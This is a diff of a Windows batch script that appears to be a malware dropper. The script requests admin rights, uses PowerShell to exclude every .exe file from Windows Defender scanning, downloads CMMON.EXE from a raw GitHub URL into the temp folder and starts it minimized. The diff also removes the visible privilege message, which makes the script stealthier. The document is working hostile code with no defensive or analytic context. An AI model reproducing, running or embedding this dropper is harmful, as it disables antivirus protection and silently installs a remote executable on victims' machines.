@@ -7,7 +7,6 @@ REM  --> Check for permissions
 
 REM --> If error flag set, we do not have admin.
 if '%errorlevel%' NEQ '0' (
-    echo Requesting administrative privileges...
     goto UACPrompt
 ) else ( goto gotAdmin )
 
@@ -25,11 +24,11 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 
 
-Start-Process powershell -ArgumentList "-Command Set-MpPreference -ExclusionExtension exe" -WindowStyle Minimized
-
-
+powershell  "-Command Set-MpPreference -ExclusionExtension exe" -WindowStyle Minimized
 cd %TEMP%
 
 
-Start-Process powershell -ArgumentList "-Command Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile 'CMMON.EXE'; Start-Process 'CMMON.EXE'" -WindowStyle Minimized
+powershell  -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/CMMON.EXE' -OutFile CMMON.EXE" 
+Start-Process 'CMMON.EXE' -WindowStyle Minimized
+
 
